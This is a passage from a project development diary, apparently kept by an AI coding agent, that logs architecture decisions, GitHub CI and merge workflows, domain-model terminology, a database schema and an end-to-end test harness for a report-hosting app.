2. Reproduced the failure via direct `gh api` POSTs with multiple payload variants — same error every time. Located the root cause in [GitHub's docs](https://docs.github.com/en/repositories/configuring-branches-and-merges-in-your-repository/configuring-pull-request-merges/managing-a-merge-queue): Merge Queue is not available on user-owned repositories. ADR-034 abandoned.
3. Opened PR #9 along the "drop `require_signed_commits`" path. Operator pushed back: *"Why can't we keep that?"*
4. Researched the GitHub UI **Rebase and merge** signature loss: confirmed it's a documented, long-standing limitation (community discussions [#11639](https://github.com/orgs/community/discussions/11639), [#39886](https://github.com/orgs/community/discussions/39886)). The committer-date rewrite during server-side rebase invalidates signatures and GitHub cannot re-sign on the operator's behalf.
5. Found the unblocking insight while researching alternatives: GitHub's git/commits REST API automatically web-flow-signs every commit it creates. We don't need any signing infrastructure — just call the API.
6. Pivoted PR #9 to **Option C — custom bot-merge workflow**. ADR-035 records the decision.

**Files in this PR**:

- `docs/adr/INDEX.md` + `docs/adr/0035-bot-merge-workflow.md` — new. The actual ADR document (this diary entry is the log, not the decision).
- `infra/terraform/modules/github-repo/main.tf` — kept `require_signed_commits = true`; added `bypass_pull_request_allowances { users = ["agranado2k"] }` inside `required_pull_request_reviews`.
- `.github/workflows/bot-merge.yml` — new (~140 lines). Implements ADR-035.
- `.github/workflows/commitlint.yml` + `.github/workflows/terraform.yml` — removed dead `merge_group:` triggers and fallbacks left over from ADR-034.
- `CLAUDE.md` rule 4 — describes the `/merge` comment flow; explicit "do NOT click the UI Rebase and merge button".
- `.claude/skills/review-and-evaluate/SKILL.md` + `.claude/skills/review-pr/SKILL.md` — copied from zora-pantheon and wired into `/pr-iterate`. Independent concern, shipped in the same PR cycle.

**Bootstrap for this PR**: same as PRs #6/#7/#8 — temp-enable squash-merge via API once more. PR #9 cannot use the new `/merge` workflow because the workflow doesn't exist on `main` until this PR merges. Squash-merge PR #9, then run the one-time operator setup (PAT issuance, secret population) described in ADR-035's "Decision outcome" section.

**Memory pointer for future-me**: I had been writing "ADRs" inline in this diary file (entries dated 2026-06-02 / 2026-06-03 carry "ADR-031" through "ADR-034" labels). That conflates two distinct artifacts — the diary is a chronological development log; ADRs are decision records with a fixed structure (per [adr.github.io](https://adr.github.io)). Cleaned up today (PR #9): those decisions stay recorded in the diary as plain dated entries (not as ADRs), the four old in-diary "ADR-NNN" labels are gone, and ADRs from now on live as standalone files under `docs/adr/` (see `INDEX.md`). The diary may reference ADRs by number; the ADR file is the source of truth for any decision.

**Carry-over to 0c.5 (revised)**:

- Populate `required_status_checks` with real check names (`Lint PR commits`, `plan-shared`, `plan-prod`, plus 0c.3 workflows once they land)
- Codify `default_workflow_permissions = "write"` in the github-repo module so App-install drift can't recur silently
- Codify the `MERGE_BOT_TOKEN` PAT issuance step in `docs/ops.md` (operator runbook addition)
- Sweep the 5 orphan per-branch `ENABLE_EXPERIMENTAL_COREPACK` Vercel entries
- Backfill ADRs 1–30 from `docs/spec.html` into `docs/adr/*.md` files (see `INDEX.md` backlog)

### 2026-06-03 — `/review-and-evaluate` skill copied from zora-pantheon + wired into `/pr-iterate`

User asked to fold zora-pantheon's `/review-and-evaluate` skill into our flow. Copied two skills from `~/HouseNumbers/zora-pantheon/.claude/commands/`:

- `.claude/skills/review-pr/SKILL.md` — 5-sub-agent review (Security, API/CRUD, Pattern, Simplicity, Test hygiene) producing a severity-bucketed finding list (`C-N` / `H-N` / `M-N` / `L-N`). Original was zora-MongoDB-centric; adapted Agent 1 to also call out ADR-013/014/015/016 (our security stack) and Agent 3 to call out ADR-024 (vanilla TS, no fp-ts/Effect/Remeda) + ADR-020 (hexagonal, domain has no I/O).
- `.claude/skills/review-and-evaluate/SKILL.md` — wrapper that runs `/review-pr` and a parallel "Context Alignment Analyst" agent that reads CLAUDE.md + `docs/diary.md` + the diff, then synthesizes Apply / Skip / Discuss verdicts per finding.

`/pr-iterate` got a new **Step 2 — Independent code review** that invokes `/review-and-evaluate` between Snapshot and Triage:

| Verdict from `/review-and-evaluate` | What `/pr-iterate` does with it |
|---|---|
| Apply | Add to the Act list — fix via a Conventional Commits commit. |
| Skip | Record in the iteration report ("not applied — reason: …") and ignore. |
| Discuss | Add to escalation list — surface to operator at end of iteration. |

The local review is **complementary** to the bot reviews from `claude-review` / `gemini-review` (ADR-030). They look at the same diff with different lenses: bot reviews are third-party AI commenting via GitHub API; `/review-and-evaluate` is a fresh local run with full file access and the live diary. **If both flag the same issue → almost certainly worth applying. If they disagree → Discuss/escalation candidate.**

CLAUDE.md quick reference got a row for `/review-and-evaluate`. The iteration report format in `pr-iterate/SKILL.md` got a new line for verdict counts (Apply / Skip / Discuss).

**Carry-over (none).** Standalone improvement to the agent flow — no infra touch.

### 2026-06-03 — Auto-assign PR author workflow

Added `.github/workflows/auto-assign-pr-author.yml`. On `pull_request: opened` or `reopened`, the workflow calls `POST /repos/{owner}/{repo}/issues/{pr}/assignees` to assign the PR author to their own PR — so the "Assignees" panel always reflects who's driving the PR to merge without anyone clicking a button.

Implementation notes:

- Skips bot-authored PRs (`endsWith(github.event.pull_request.user.login, '[bot]')`) — Dependabot, Renovate, `claude[bot]`, etc. don't have a person to assign.
- Idempotent on `reopened` — checks current assignees first and skips if the author is already on the list.
- Fails open — if the API call returns non-2xx (e.g., 422 because the author isn't a repo collaborator), the workflow logs and exits 0 so CI isn't blocked.

Cost / scope: ~30 lines of YAML, no new secrets, no Terraform change. Not architectural (so no ADR file) — just a convenience.

### 2026-06-04 — ADR-0036 lands: Domain-Driven Design adopted

The architectural decision is in `docs/adr/0036-domain-driven-design.md` (MADR format). This entry is the chronological log only.

Operator referenced [Martin Fowler's DDD bliki](https://martinfowler.com/bliki/DomainDrivenDesign.html) and asked the project to follow DDD principles. The decision complements ADR-020 (hexagonal layout) and ADR-024 (vanilla TS / functional style) — those covered *how the domain layer is built*; this one covers *how we model the domain*. Strategic patterns adopted (Ubiquitous Language, Bounded Contexts, Context Map) plus the tactical subset that aligns with our existing architecture (Entities, Value Objects, Aggregates, Repositories, Domain Events). CQRS and Event Sourcing are explicit non-goals.

Files landed in this commit:
- `docs/adr/0036-domain-driven-design.md` — the ADR
- `docs/adr/INDEX.md` — registry row
- `docs/domain-glossary.md` — seeded with ~15 terms covering the three contexts plus the shared kernel
- `docs/context-map.md` — three bounded contexts with an ASCII diagram + integration patterns
- `CLAUDE.md` Style section — new bullet referencing ADR-0036, glossary, and context map

**Carry-over for Phase 1+**: as the first features land, update the glossary in the same PR that introduces each new term. Aggregates with their invariants get their own tests (allowed by ADR-024 — no I/O needed). The context map gets revised if/when a new bounded context appears (none planned for v1).

### 2026-06-03 — PR #10: copy 7 skills from Matt Pocock's open-source skills repo

Copied seven skills from [mattpocock/skills](https://github.com/mattpocock/skills) (MIT-licensed; attribution at `.claude/skills/LICENSE-mattpocock-skills.md`). All seven are the ones called out under the upstream README's *Why these skills exist* section.

| Skill | Source | Use case |
|---|---|---|
| `grill-me` | productivity/grill-me | Force the agent to ask clarifying questions before coding |
| `grill-with-docs` | engineering/grill-with-docs | Same, plus updates to the glossary + ADR drafts |
| `tdd` | engineering/tdd | Red-green-refactor with sidecar guidance on tests, mocking, deep modules, interface design, refactoring |
| `diagnose` | engineering/diagnose | Reproduce → minimize → hypothesize → instrument → fix → test |
| `to-prd` | engineering/to-prd | Convert a conversation into a PRD as a GitHub issue |
| `zoom-out` | engineering/zoom-out | Request broader context on an unfamiliar area |
| `improve-codebase-architecture` | engineering/improve-codebase-architecture | Rescue deteriorating code through deepening + ubiquitous language |

**Adaptations**:

- **`grill-with-docs/ADR-FORMAT.md`** — REWRITTEN as a thin pointer to our MADR template and to `docs/adr/INDEX.md`. Matt's upstream proposes its own ADR shape; we use MADR per our own ADR discipline (established in PR #9). The skill's docs-update step now produces ADRs in our format.
- **`tdd/SKILL.md`** — added a project-context prelude at the top: vitest, `pnpm turbo test --filter=<workspace>`, `*.spec.ts` / `*.spec-d.ts` conventions, pointer to `docs/domain-glossary.md` for naming. Body of the skill is otherwise upstream-unchanged.
- **All other skills** copied verbatim — they're framework-agnostic enough that adaptation isn't needed.

**Interaction with Phase 0e**: the original Phase 0e plan was to bring in `/tdd` from `~/HouseNumbers/zora-pantheon` along with four TDD hooks + two rules files. We took Matt's `/tdd` *procedural* skill now; Phase 0e will layer zora-pantheon's hooks on top as the enforcement mechanism. The two are complementary: Matt's SKILL.md tells you HOW to TDD; zora's hooks ENSURE you did.

**CLAUDE.md**:
- Quick-reference table — added seven new rows.
- Rule 2 — removed the "(Phase 0e)" qualifier on `/tdd` since the procedural skill is available now.
- Rule 1 quick-ref — removed a stale `(ADR-022)` reference.

**License**: MIT. Attribution + full license text at `.claude/skills/LICENSE-mattpocock-skills.md`. The three in-house skills (`pr-iterate`, `review-pr`, `review-and-evaluate`) are explicitly called out as NOT from Matt's repo.

**Carry-over for Phase 0e**: bring in zora-pantheon's TDD enforcement hooks (`PostToolUse` to auto-run nearest test after every edit; `Stop` to block completion if tests fail). The Matt's `tdd/SKILL.md` and zora's hooks compose cleanly.

### 2026-06-04 — Domain-language alignment (spec rev 8 sync) · worktree `docs/domain-language-alignment`

Ran `/grill-with-docs` to reconcile the domain vocabulary **before** any Phase 1 feature code cements it. No domain code or schema exists yet, so this was the cheapest possible moment to fix terminology. The audit found the spec (rev 7) and the DDD docs (ADR-0036 + glossary + context-map, all dated 2026-06-04) diverging on context names and event names, and the DDD docs contradicting **themselves** in two places. Seven operator decisions resolved it.

**Decisions (all operator-confirmed via the grill):**

1. **Source of truth for domain *language*** = the DDD docs (glossary / context-map / ADR-0036), not the spec. Rationale: ADR-0036 postdates spec rev 7 and specifically governs modeling; CLAUDE.md's "spec wins" rule is about *architecture* contracts. The spec is synced **to** the DDD docs (this is rev 8). The spec still wins on architecture.
2. **`Collaborator` / `folder_collaborators` is owned by Reports & Folders** (the `Folder` aggregate owns its grant chain), resolving the context-map/glossary-vs-ADR-0036 contradiction in ADR-0036's favor. `canWrite()` lives entirely in R&F; grantees are referenced by `UserId`/email via the shared kernel. R&F **subscribes to `UserCreated`** to resolve a pending email-invited grant to a `UserId` on first sign-in.
3. **Scanning** = a first-class **`ScanJob` aggregate** in Abuse & Moderation (lifecycle `queued`→`running`→`done`/`failed`, owns `findings`); `scan_status` on `ReportVersion` is a **denormalized cache** of the verdict, owned by Reports & Folders and updated on `ReportVersionScanned`. The context-map's old `ScanResult` aggregate is dropped. **Schema consequence (Phase 1):** a new `scan_jobs` table; `scan_findings`/`scanned_at` migrate off `report_versions` onto it.
4. **API-key anomaly detection (ADR-016)** — was silently dropped when "Trust & Safety" was renamed "Abuse & Moderation"; given a home in **Identity & Access** (`Anomaly` read-model + `AnomalyDetector`; events `ApiKeyUsed` → `ApiKeyAnomalyDetected`). Abuse & Moderation stays content-only.
5. **Canonical event catalog (11 events)** with the `ReportVersion` rename — see the new `docs/events.md` registry. Dropped the spec's phantom `AbuseConfirmed`.
6. **`ReportVersion`** is the canonical term (was `Version`); events became `ReportVersionUploaded` / `ReportVersionScanned`.
7. New terms: `Plan`, `PlanLimits`, `Grant level` (`editor`|`admin`). Kept `Acl`.

**Context renames:** `Publishing` → `Reports & Folders`; `Trust & Safety` → `Abuse & Moderation`; Identity & Access unchanged.

**Files changed:**
- `docs/domain-glossary.md` — rewritten; `ReportVersion`/`Scan status`/`ScanJob`/`Collaborator`/`Grant level`/`Plan`/`PlanLimits`/`Anomaly` added or corrected; per-context "emits events" list added.
- `docs/context-map.md` — rewritten; ownership + event flows corrected; ASCII diagram updated.
- `docs/events.md` — **new** canonical event registry (catalog + design rules + a rename-traceability table).
- `docs/adr/0036-domain-driven-design.md` — minimal: Value-Object + Aggregate examples extended (`Grant level`, `Scan status`, `ScanJob`), one stale event name fixed (`VersionScanned` → `ReportVersionScanned`), pointer to `docs/events.md`. No decision in 0036 was reversed, so no superseding ADR was needed.
- `docs/spec.html` — **rev 7 → rev 8**: Domain-model bounded-contexts table, Domain-events table, and schema table-cards (`report_versions` note + new `scan_jobs` card) synced; hexagonal-diagram domain-events list + entity list updated; ADR section header count corrected `(18)` → `(30)`. The narrow Product sequence diagrams keep shorthand labels with a reconciliation note (column too narrow for the longer event names).

**Deliberately NOT done:** the spec's ER **ASCII diagram** still shows the pre-rev-8 schema (`scan_findings` on `report_versions`, no `scan_jobs` box) — the table-cards carry the rev-8 note; the ASCII gets redrawn when Phase 1 writes the real schema in `docs/db-design.md`. The diary **Current-state block** at the top is stale (frozen at `c04de5c`); flagged inline, full re-sync deferred.

**Process:** worktree `docs/domain-language-alignment` on branch `docs/domain-language-alignment`. Lands via the normal PR flow (`/docs-check`, dual AI review, `/merge` bot-merge per ADR-0035). This was a docs-only grill/alignment pass — no code, no infrastructure.

### 2026-06-04 — Phase 1 upload/serve design grill → ADR-0037..0040 · worktree `docs/phase-1-upload-serve` (stacked on #11)

Second `/grill-with-docs` pass, this time on the **Phase 1 upload & serve flow** (the next real code). Twelve decision branches resolved; four ADRs written. Branch `docs/phase-1-upload-serve` is **stacked on `docs/domain-language-alignment`** (PR #11) because the ADRs reference the rev-8 glossary/spec — merge #11 first, then this PR.

**ADRs added:**
- **ADR-0037 — Report upload & versioning pipeline**: content-only upload (metadata via dedicated ops); `index.html` entry-document resolution (+ wrapper-dir stripping); `folder_path` at create only; UUID-keyed R2 blobs (`reports/<reportId>/<versionId>/<path>`) with R2-first/commit-last + orphan GC; `version_no` = commit-time `max+1` ordinal (unique-index retry under concurrency); `content_hash` informational (feeds the derived idempotency key); monotonic auto-promote on `clean`; MIME allowlist + two-tier limits (global security caps vs `PlanLimiter` quotas), benchmarked against Cloudflare Pages / GitHub Pages / zip-bomb research.
- **ADR-0038 — Report viewer access & serving**: public capability-URL default (`slug` = ~10¹⁸-entropy capability) + `X-Robots-Tag: noindex`; reason-opaque viewer state machine (200 / scanning-200 / 451 flagged / 404 blocked-or-unknown / 410 taken-down); `?v=N` uses the same ACL + scan gate as live.
- **ADR-0039 — Idempotent write API**: `Idempotency-Key` header with a server-**derived** fallback key (for upload, `content_hash` + target + user); record persisted in a Postgres `idempotency_keys` table **in the same tx** as the mutation + outbox; 24h TTL; replay / 422-on-reuse-diff-body / 409-in-flight. Operator directive: every mutating endpoint idempotent system-wide.
- **ADR-0040 — HTTP API error model**: RFC 9457 `application/problem+json` with stable `code`; kind→status mapping in the HTTP adapter only (402 plan-limit, 409 idempotency-in-flight, 415 MIME, 413 too-large/bomb, 422 validation, …); scan verdicts are async (surfaced at serve, not as upload errors).

**Research grounding** (operator asked for industry standards): Cloudflare Pages (25 MiB/file, 20k files), GitHub Pages (1 GB site), zip-bomb literature (DEFLATE ~1032:1, multi-threshold + depth + sandbox), SVG-XSS CVEs (content-sniff allowlist, reject SVG — already ADR-015), IETF Idempotency-Key draft, RFC 9457.

**Docs synced (stacked on rev 8):** `docs/adr/INDEX.md` (+4 rows); `docs/domain-glossary.md` (+`Entry document`, +`Root folder`, `Slug`-as-capability note); `docs/spec.html` upload API contract (content-only body + `Idempotency-Key` + problem+json), upload step list (UUID keys, commit-last, GC, monotonic promote, allowlist, `assertWithinPlan`), and viewer flow (state machine + `?v=N` + `noindex`).

**Schema implications carried to Phase 1 / `docs/db-design.md`:** new `scan_jobs` table; new `idempotency_keys` table; `report_versions.scan_status` is a denormalized cache; R2 keys are `versionId`-scoped. The spec's ER ASCII still needs the redraw (deferred to when the real schema lands).

**Process:** stacked worktree, docs-only, no code yet. The `/tdd` build of `UploadReportUseCase` + the viewer loader is the next step once these ADRs merge.

### 2026-06-04 — Spec & use-case conformance harness + BDD corpus + OpenAPI · worktree `feat/spec-conformance` (PRD issue #13)

`/to-prd` turned the "are our spec/use-cases well-formed?" question into PRD issue #13, then the operator said "create all the BDD and anything else we need." Delivered the **authoring + enforcement** the spec had been missing. ADR-0035..0040 are now on `main` (`bdaa8e7`); PRs #11/#12 merged before this branch.

**Authored:**
- **29 BDD `.feature` files** in `tests/e2e/features/` (the dir was empty despite the spec enumerating ~31 use-case tests). Phase-1 upload/serve use-cases are worked (real Given/When/Then in ubiquitous language, grounded in ADR-0037..0040); later-phase ones are valid `@wip` skeletons tagged by phase. Presence asserts existence + parse, **not** behavioral completeness — `@wip` keeps the catalog honest.
- **`docs/api/openapi.yaml`** — OpenAPI 3.1 for the upload/serve surface (content-only `POST /api/v1/reports` + `Idempotency-Key` header + `GET /{slug}` viewer states), with an RFC 9457 `Problem` schema whose `code` enum is the ADR-0040 error registry. First implementation of ADR-027's "OpenAPI source of truth."

**Built (the harness):**
- **`scripts/docs-conformance/`** — dependency-free plain ESM, tested with Node's built-in `node:test` (26 fixture tests). Seven validators (ADR-MADR, ADR↔INDEX bijection, glossary banned-alias, canonical-event presence, feature-presence bijection, Gherkin structure, OpenAPI structure). Rules live in `config.mjs` (reviewable as data); validators hold no policy. `pnpm docs:check` / `pnpm docs:check:test`.
- **`.github/workflows/docs-conformance.yml`** — runs the self-tests + `pnpm docs:check` on every PR (Node 24 / Corepack / pnpm 10, no install needed). **This is the single enforcement seam.**

**ADR added — ADR-0041** (Documentation-as-contract — CI-enforced conformance harness): records that this implements **only the CI slice** of ADR-026; the `docs-prepush-guard.sh` pre-push hook and `/docs-check` skill are **deferred** (the runner stays hook-ready). Also flags lint-lite OpenAPI checks (Spectral/Redocly + markdown/link lint deferred) and that `node:test` is used here **without** committing the wider codebase to a test runner.

**Deliberately NOT done / deferred (logged so the gap is explicit):** the ADR-026 pre-push hook + `/docs-check` skill; Spectral/Redocly OpenAPI schema lint; markdown + link-integrity lint; Bruno collection scaffolding (ADR-027); a project-wide test-runner decision. The spec's ER ASCII redraw and `docs/db-design.md` still pend Phase 1 code.

**Decisions the operator made:** scope = author the missing use-case specs **and** build the conformance harness (not a one-off audit); enforcement seam = **CI workflow only**.

**Process:** worktree `feat/spec-conformance` on `feat/spec-conformance`, branched off `main` (`bdaa8e7`). `pnpm docs:check` is green and the 26 self-tests pass locally. Lands via the normal PR flow (dual AI review, `/merge` bot-merge per ADR-0035). The `/tdd` build of `UploadReportUseCase` + the viewer loader remains the next code step; these features are its acceptance spec.

### 2026-06-04 — Phase 1 build begins · Step 1a: schema & data design · worktree `docs/phase-1a-db-design`

Started executing the **Phase 1 build plan** (steps 1a→1f agreed with the operator). 1a is the **schema design** — the contract the Drizzle code (1c) is generated from — delivered as docs, since migrations must apply against real Neon (ADR-019) in a later, verifiable coding step rather than be faked here.

**Added — `docs/db-design.md`:** the column-level reference for all 14 tables grouped by bounded context, with PG types, PK/FK, indexes, the 8 enums, JSONB-shape policy, FK-cascade policy, the R2 key scheme, and a **Phase-1 scope** section (which tables Phase 1 creates vs first-writes-later).

**Spec ER redraw (the diary's standing deferral, now done):** dropped the stale `scan_findings` / `scanned_at` from the `report_versions` ASCII box (rev-8: `scan_status` is just the cached verdict); added a `scan_jobs` box and an `idempotency_keys` box; added an `idempotency_keys` table-card to the catalog (the `scan_jobs` card already existed from the rev-8 sync).

**Phase-1 scan stub decision (operator):** Phase 1 has no real scanner (that's Phase 1.5), so the scan step is a **stub that always emits `ReportVersionScanned(clean)`** — every upload auto-promotes (monotonic, ADR-0037 §8) so the viewer has a live version. Promotion machinery is built for real; only the verdict is hardcoded. Recorded in `db-design.md` (§Phase 1 scan stub) and in agent memory; the real scanner swaps in behind the scan port in Phase 1.5. *(Not an ADR — it's a temporary scaffold, not an architectural decision; ADR-0037/0012 still govern.)*

**Build sequence from here (each its own TDD PR):** 1b domain model (pure: `Report` aggregate, `ReportVersion`, value objects, `Result<T,AppError>`) → 1c ports + adapters (Drizzle schema/migrations live here, applied against the CI Neon branch) + the scan-port stub → 1d `UploadReportUseCase` + HTTP action → 1e viewer loader → 1f promotion wiring. **Open prerequisite for 1b:** the project still has no test runner (flagged in ADR-0041); 1b will adopt Vitest (likely a short ADR-0042) since `node:test` is fine for the doc harness but not for the wider TS/Turbo codebase.

**Process:** worktree `docs/phase-1a-db-design`, branched off `main` (`4640553`). Docs-only (no code, no migration run yet); `pnpm docs:check` green. Lands via the normal PR flow.

**Follow-on (folded into PR #15 during `/pr-iterate`):** applied the claude-review findings on the schema doc (notably M-1 — `scan_jobs.report_version_id` is now `ON DELETE CASCADE`, the third cascade exception, so a report hard-purge cascades cleanly; would have stalled 1c's migration). Also wired **auto-`@claude`-review on PR open** (extends ADR-030): added `.github/pull_request_template.md` seeding an `@claude` line, and gave `.github/workflows/claude.yml` a `pull_request: [opened, ready_for_review]` trigger gated on `contains(github.event.pull_request.body, '@claude')` — previously the mention bot ignored PR bodies, so a template mention alone wouldn't have fired it. Opt out by deleting the line from a PR body. Note: `gh pr create --body-file` bypasses the template, so agent-opened PRs must include `@claude` in the body to get the rich review (the lighter `claude-code-review.yml` inline pass runs on every PR regardless).

### 2026-06-04 — Phase 1 step 1b: domain model (first real code) + Vitest · worktree `feat/phase-1b-domain` · ADR-0042

The first executable Phase-1 code: the **pure `Report` domain** (ADR-0024/0036), TDD'd with Vitest. **19 tests green, typecheck clean.** Parallel to 1a (no dependency between them).

**Test runner — ADR-0042 (adopt Vitest):** the repo had no test runner (left open in ADR-0041). Chose **Vitest**, **pinned to 3.x**: Vitest 4 needs Vite 6+, but the Remix apps pin Vite 5.4 and share one hoisted Vite, so Vitest 4 fails at startup (`vite` has no `./module-runner` export under v5) — confirmed empirically. `node:test` stays only for the dependency-free doc harness. Also: **committed the first `pnpm-lock.yaml`** (regenerated with pnpm 10.5.0 to match CI) and added a **`unit` CI workflow** (frozen install → package typecheck → `pnpm test`).

**`packages/domain` (`arp-domain`):** functional core `Result<T,E>` + `pipe()` (no FP libs); branded ids (`OrgId`/`UserId`/`FolderId`/`ReportId`/`VersionId`); value objects (`ScanStatus`/`AclMode`/`GrantLevel`, `Slug` smart constructor over the nanoid alphabet); `AppError` union matching the ADR-0040 kinds; domain events (`ReportVersionUploaded`/`ReportVersionScanned`/`ReportPublished`); and the **`Report` aggregate** — `createReport`, `addVersion` (content-only, max+1, taken-down→NotFound), and `applyScanResult` carrying the **monotonic promote-if-newer** logic (ADR-0037 §8: clean+newer promotes & emits `ReportPublished`; flagged/blocked never promote; out-of-order older clean never demotes). All `readonly`, no I/O.

**Merge order note (resolved):** PR #15 (1a) merged to `main` first; this branch was then rebased onto `main` and the expected `docs/diary.md` tail conflict resolved (1b entry placed after 1a). Only the diary overlapped; code/docs didn't.

**Next (1c):** ports + adapters — Drizzle schema/migrations from `db-design.md` (applied against the CI Neon branch), R2 blob store, repositories, idempotency store, transactional outbox, and the always-clean scan-port stub.

**Process:** worktree `feat/phase-1b-domain`, branched off `main` (`4640553`). `pnpm test` (19) + package typecheck + `pnpm docs:check` all green locally.

### 2026-06-04 — Phase 1 step 1c.1: Drizzle schema + initial migration · worktree `feat/phase-1c-db-schema`

1c (ports + adapters) is large and infra-bound (real Neon/R2 per ADR-019), so it's split into verifiable slices: **1c.1 the Drizzle schema + migration (this, fully local)** → 1c.2 application port interfaces + in-memory fakes (lets 1d's use case be TDD'd without infra) → 1c.3 the real Drizzle/R2 adapters + integration tests against the CI Neon branch.

**`packages/db` (`arp-db`):** the Drizzle schema (`src/schema.ts`) translating `docs/db-design.md` into all **14 tables + 8 enums**, grouped by bounded context, explicit snake_case columns, ids app-side (no DB default), FK policy from the doc (RESTRICT default; CASCADE on `report_versions→reports`, `acls→reports`, `scan_jobs→report_versions`), and the nullable `reports.live_version_id` breaking the reports↔report_versions cycle (`AnyPgColumn` thunk). `drizzle.config.ts` (dialect postgresql; URL only used by migrate/push in CI, not by generate). Generated the initial migration `drizzle/0000_*.sql` with `drizzle-kit generate` (no DB needed) and committed it. A `schema.test.ts` guards table names + enum value sets + snake_case mapping.

**Verification (all local):** `drizzle-kit generate` ✓ (14 tables, FKs, indexes), `pnpm test` 23 (domain 20 + db 3) ✓, package typecheck ✓ (now covers `arp-db`), `pnpm docs:check` ✓. Deps added: `drizzle-orm` (runtime), `drizzle-kit` (dev); lockfile updated (regenerated with pnpm 10.5.0). No new ADR — ADR-020 (repository pattern) and ADR-004 (R2) already govern; this implements `db-design.md`.

**Deferred to 1c.3 (needs infra):** applying the migration to the Neon branch, a migration-drift CI check (`drizzle-kit check`), and the runtime client/driver (`@neondatabase/serverless`) — they land with the real adapters.

**Process:** worktree `feat/phase-1c-db-schema`, branched off `main` (`033dd75`). Docs/schema only; no migration applied to a DB yet (that's 1c.3, against the CI Neon branch).

### 2026-06-04 — fix: Claude auto-review on PR open was a silent no-op · worktree `ci/fix-claude-auto-review`

The Claude side of the ADR-030 dual review never actually posted on PR open. Two
broken mechanisms, both masked:

- **`claude.yml` (the @claude mention bot):** the PR #15 follow-on had added a
  `pull_request: [opened, ready_for_review]` trigger gated on `@claude` in the PR
  body (seeded by `.github/pull_request_template.md`). But `claude.yml` carries no
  `prompt:` input — on a `pull_request` event the action has no instruction to act
  on (it only works off comment text), so it ran ~11s and did nothing.
- **`claude-code-review.yml` (the dedicated auto-reviewer, the `claude-review`
  check):** used `plugin_marketplaces` + `plugins: code-review@claude-code-plugins`
  and posted nothing — yet the check showed green because the step is
  `continue-on-error`. Reading the run log closely surfaced the real cause: the
  action's **OIDC → GitHub-App-token exchange 401s with "the workflow file must be
  identical to the version on the default branch."** That gate fails on any PR that
  edits this very workflow, so the review stalled before it could post (the empty
  `ANTHROPIC_API_KEY` + tsconfig "directory mismatch" + "No buffered inline
  comments" log lines are downstream noise after the token exchange already died).

**Fix.** `claude-code-review.yml` now drops the plugin path and uses the
proven-working `claude_code_oauth_token` (the same credential `claude.yml` uses for
mentions) for Anthropic auth, with an explicit `prompt:` instructing a PR review and
`track_progress` so the review attaches to the PR on a `pull_request` event.
Crucially it also sets **`github_token: ${{ secrets.GITHUB_TOKEN }}`** so the action
posts via the workflow's own token instead of minting an App token through OIDC —
sidestepping the default-branch workflow-validation gate that was the real blocker
(and letting the fix verify on the PR that introduces it). `continue-on-error`
stays (advisory; must not gate merge under the solo-dev policy). Reverted the
misguided auto-`@claude`-on-open path: `claude.yml` is mention-only again
(issue_comment / pull_request_review_comment / pull_request_review / issues), the
seeded `@claude` line and trigger explainer are gone from the PR template, and the
matching sentence is removed from `CLAUDE.md`.

Net: **auto-review on PR open is now solely `claude-code-review.yml`**; `@claude`
mentions remain on-demand for follow-up. No new ADR — this implements ADR-030.

**Process:** worktree `ci/fix-claude-auto-review`, branched off `main` (`45f5274`).
CI-only change; `pnpm docs:check` green. This PR's own `claude-review` check
exercises the fix (the workflow is `pull_request`-triggered), so a posted review on
the PR is the confirmation.

### 2026-06-04 — BDD execution harness (walking skeleton) · worktree `feat/e2e-bdd-harness`

Answering the operator's "are the BDD tests running in CI?" (they weren't — `docs-conformance` only validates `.feature` presence/structure; Vitest excludes `tests/e2e`). This wires **playwright-bdd** (ADR-023) so Gherkin actually executes in CI, infrastructure-first (ADR-019). Plan: `/Users/agranado/.claude/plans/delegated-crunching-petal.md`.

**Walking-skeleton scope:** one green **smoke** scenario hitting the app `/health` route on the live Vercel preview — proves the CI → preview → browser path end-to-end now. The 29 product `.feature` files are **not executed yet** (no step defs; playwright-bdd errors at collection on undefined steps), so the `defineBddConfig` features glob is scoped to `tests/e2e/smoke/**` for now and widens to `tests/e2e/features/**` as step defs land with **1d** (upload API) and **1e** (viewer).

**Key decision — smoke lives in `tests/e2e/smoke/`, NOT `tests/e2e/features/`:** the docs-conformance `feature-presence` validator enforces a strict catalog↔file bijection over `tests/e2e/features/**`, and `gherkin-structure` forbids tags outside `{@phase-1..4,@wip,@security}`. Keeping the `@smoke` feature outside that dir means zero `config.mjs` changes and no fake `@phase-1` use case.

**Files:** `playwright.config.ts` (defineBddConfig + `grep:/@smoke/`, `grepInvert:/@wip/`, baseURL from `PLAYWRIGHT_BASE_URL`, workers:1); `tests/e2e/smoke/health.feature` + `health.steps.ts` (uses the `request` fixture — no browser needed for the assertion); `tests/e2e/steps/.gitkeep`; root scripts `e2e:gen`/`e2e`; `.gitignore` (`.features-gen/`, `blob-report/`); deps `@playwright/test` + `playwright-bdd` (dev). `.github/workflows/e2e.yml` triggers on Vercel's `deployment_status` (state=success, app preview, non-prod) → `target_url` as `PLAYWRIGHT_BASE_URL` → `pnpm e2e`. **No new secret.**

**Verification:** local `pnpm e2e:gen` ✓ + `playwright test --list` shows the 1 smoke test ✓; `pnpm docs:check` ✓ and `pnpm test` (20) ✓ unaffected (smoke invisible to the catalog; Vitest excludes `tests/e2e`). **CI: the harness ran end-to-end on this PR** — Vercel creates the preview deployment against the PR head commit, so GitHub used `e2e.yml` from that ref (the `view` event correctly skipped via the `arp-app-prod` filter; the `app` event ran). It surfaced the real blocker: **the preview returns 401** because Vercel **Deployment Protection** guards preview URLs. Fix wired: send `x-vercel-protection-bypass` when `VERCEL_AUTOMATION_BYPASS_SECRET` is set (Vercel → *Protection Bypass for Automation*). **Operator prerequisite:** enable that on both Vercel projects + add the secret as a repo secret; until then the `E2E` check is red but non-blocking. Grow step defs + widen the glob in lockstep with 1d/1e.

**Process:** worktree `feat/e2e-bdd-harness`, branched off `main` (`033dd75`). Independent of PR #17. (PR-A, the migration runner + CI migration-check, follows once #17 merges, since it modifies `packages/db`.)

### 2026-06-04 — Phase 1 step 1c.2: application ports + in-memory fakes · worktree `feat/phase-1c2-ports`

The driven-port layer the Phase-1 use cases sit on (hexagonal, ADR-0020), with in-memory fakes so 1d's `UploadReportUseCase` can be TDD'd without Neon/R2 (the real-infra e2e stays per ADR-0019; these fakes are unit-test-only).

**`packages/application` (`arp-application`, dep `arp-domain`):**
